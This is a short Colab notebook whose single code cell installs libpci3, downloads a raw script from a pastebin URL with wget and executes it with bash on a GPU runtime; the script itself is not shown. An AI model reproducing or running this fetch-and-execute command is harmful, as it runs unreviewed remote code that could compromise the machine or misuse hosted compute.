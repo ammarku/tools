{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "PasteBin.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyOK6gwe3Q72W15oCl7bO3Sn",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/ammarku/tools/blob/main/RunPasteBin.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "sMao_sOS5Jpi"
      },
      "outputs": [],
      "source": [
        "!apt-get update \n",
        "!apt-get install libpci3\n",
        "!wget https://pastebin.com/raw/cJLyq81J\n",
        "!bash cJLyq81J"
      ]
    }
  ]
}